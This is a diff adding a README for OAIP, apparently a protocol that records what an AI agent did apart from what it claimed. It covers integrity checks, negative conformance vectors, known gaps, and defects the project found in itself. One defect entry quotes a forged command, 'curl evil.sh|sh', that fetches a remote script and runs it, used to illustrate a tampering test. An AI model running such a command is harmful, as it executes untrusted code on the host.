@@ -1,0 +1,165 @@
+# OAIP — Observed Action & Intent Protocol
+
+> A record of what an AI agent actually *did*, separate from what it claimed and
+> separate from whether anyone accepted the claim. An **Intent** says what was
+> attempted; an **Execution** records the invocation with before/after workspace
+> snapshots; **Effects** are the per-file changes; an **Attribution** links a
+> change to an actor with declared confidence; a **ClaimCandidate** is a claim
+> about the result — and a claim is *never* accepted by this protocol. Acceptance
+> is a signed [Warrant](https://github.com/s0fractal/warrant) record, which is a
+> different object with a different trust model.
+
+This file exists so that a reader — human or model — does not have to infer the
+things below from source. Everything in it is checkable in one command.
+
+## The single most important rule (SPEC §4)
+
+**Execution success is not validation, and validation is not acceptance.**
+`exit_code == 0` earns nothing. A claim runs a *separate* validation check, and
+only a signed Warrant record accepts it. A refusal is a record, not the absence
+of one.
+
+If you take one thing from this file: any reading of OAIP where a successful
+command implies an accepted claim is wrong, and the end-to-end demo prints the
+refusal on purpose.
+
+## Check anything in one command
+
+Nothing here asks to be believed. Offline, stdlib only, no account:
+
+```bash
+python3 tools/check.py                  # everything, one verdict
+python3 tools/check.py --list           # what runs, what it needs, what it must print
+python3 tools/check.py --allow-unrun    # tolerate a missing Warrant checkout
+```
+
+A check that **could not run** is reported as `UNRUN` and exits 2 — never as a
+pass. That distinction is load-bearing here: `tools/intoto.py selftest` used to
+print `SKIP … ledger has no claims` and exit 0 in any clean checkout, which is the
+only outcome it could ever have produced in CI.
+
+Warrant is a **normative dependency**, not an optional extra (§1 defines
+canonicalization as "exactly per Warrant SPEC §4"; §3 makes the decision layer a
+real Warrant record). Set `WARRANT_IMPL` / `WARRANT_CLI`, or keep a checkout at
+`~/Projects/warrant`.
+
+## Interoperating with the provenance world
+
+OAIP's observation records overlap with existing standards, and pretending
+otherwise would be a strategic error. The honest map:
+
+| OAIP | Existing equivalent |
+|---|---|
+| Execution | SLSA `runDetails` / an OpenTelemetry span |
+| Effect | SLSA byproducts / materials |
+| Artifact, State | in-toto ResourceDescriptor |
+| ClaimCandidate | in-toto Statement |
+
+```bash
+python3 tools/intoto.py wrap <claim-id>     # → in-toto Statement v1
+python3 tools/intoto.py check <file>        # does it bind to this ledger?
+```
+
+`predicateType` is `https://github.com/s0fractal/oaip/claimcandidate/v0` — a URI
+this project controls, deliberately not a domain it does not own. The Statement is
+**not** signed by the converter: DSSE wrapping and Rekor submission are separate
+steps with separate trust.
+
+What neither in-toto nor SLSA has, and why OAIP is not simply deleted in their
+favour: the **acceptance boundary** (they attest what happened; neither can
+express "this ran, and was refused") and **attribution with declared
+uncertainty** (`confidence_ppm` as an integer, with `method` naming how the causal
+link was drawn).
+
+## Where the honest gaps are
+
+Listed because a reviewer will find them anyway, and finding them listed is
+better evidence of good faith than finding them hidden.
+
+- **SPEC §2.4 and the reference implementation disagree on field names.** §2.4
+  declares Execution fields `invocation`, `status`, `input_state`, `output_state`,
+  `environment`; `impl/oaip.py` stores `command`, `exit_code`, `before_tree`,
+  `after_tree`, `env_fp`. **A third-party implementer following the specification
+  would emit artifacts incompatible with the reference.** The in-toto converter
+  follows the implementation and says so in a comment. Aligning them is a format
+  decision that has not been made — not a converter side effect.
+- **One implementation.** Warrant has three that agree on broken stores; OAIP has
+  Python only. Until a second exists, "conformant" here means "agrees with
+  itself". This is the reason the negative vectors below were written first: a
+  second implementation that agreed only on well-formed records would prove
+  nothing.
+- **Attribution is exclusive-window only.** §2 requires that a weaker method (it
+  names a File-Watcher-only guess) carry a lower `confidence_ppm` *and its own
+  `method`* — so the format provides for uncertain causality. The reference
+  implementation only ever wraps the command, i.e. it emits the one method it can
+  claim honestly and never exercises the low-confidence path. The hard case is
+  specified, not implemented.
+- **No signing of OAIP records themselves.** Integrity comes from
+  content-addressing plus the Warrant record at the decision layer; the artifacts
+  are not individually signed.
+- **§5 rebuild covers the projection, not the Warrant store.** `oaip rebuild`
+  reconstructs the SQLite index from `.oaip/artifacts`; it does not re-derive the
+  decision layer, which is Warrant's own artifact.
+
+## Conformance vectors, including the negative half
+
+`examples/vectors.json` carries two kinds:
+
+- **`records`** — canonical bytes and their SHA-256, byte-exact.
+- **`reject`** — 25 byte sequences a conforming implementation MUST refuse.
+  `class=not-ijson` (17) is valid JSON that I-JSON forbids: duplicate member
+  names, `NaN`/`Infinity`, lone surrogates, floats anywhere, a leading BOM. That
+  group is the one that actually splits implementations. `class=not-json` (8)
+  fails in any correct parser and is present so a failure can be told apart from a
+  strictness gap.
+
+Positive vectors alone cannot establish conformance: **an implementation that
+accepts everything passes every positive vector.**
+
+On the BOM specifically: RFC 8259 §8.1 lets a receiver ignore one, so rejecting it
+is a deliberate narrowing rather than a grammar rule. "MAY ignore" is unaffordable
+in a content-addressed format — the same record would have two addresses. Measured:
+Python's `json.loads` strips a BOM from *bytes*, Go's `encoding/json` rejects it.
+
+## Defects found in this repository, and how
+
+Kept because the pattern is more useful than the list, and because a project that
+reports only its successes is not reporting.
+
+The recurring class is **checking something adjacent to the evidence**:
+
+- `oaip verify` shelled out to `warrant verify` on the neighbouring decision store
+  and examined **no byte** of `.oaip/artifacts` — the layer §5 calls the truth.
+  With all three canonical records forged it printed `0 errors` and exited 0.
+- Every reader of the canonical layer used bare `json.loads(read_bytes())` and
+  never recomputed the address. An execution record's `command` was rewritten to
+  `sh -c curl evil.sh|sh`; `rebuild` reported success and the projection asserted
+  the forged command while the file still sat under its original name. Content-
+  addressed storage whose reader never checks the address is a directory of files
+  with long names.
+- `tests/projection_rebuild.py` could not have caught either one: it only ever
+  rebuilds from an **honest** artifact directory. Integrity is a claim about the
+  tampered cases — which is why `tests/canonical_layer.py` tampers in every case,
+  and why its own fix was verified by reverting it (17 of 20 cases fail against
+  the pre-fix implementation).
+- A commit message claimed the CI wiring was fixed; it had wired one of two new
+  tests, because the workflow listed steps by hand. CI now runs `tools/check.py`
+  and the membership lives in one place.
+
+## The specification
+
+[SPEC.md](SPEC.md) — §1 canonicalization and identity, §2 record types, §3 the
+Warrant bridge, §4 the cardinal rule, §5 canonical layer vs projection.
+
+Read §4 and §5 before anything else. They are the two places where a plausible
+misreading leads to a wrong conclusion about the whole design.
+
+## Reporting a defect
+
+Open an issue with the bytes and the command. A reproduction beats a description,
+and a cleared suspicion is a useful result — several of the checks above exist
+because a suspicion was raised, tested, and turned out to be wrong.
+
+## License
+
+MIT.
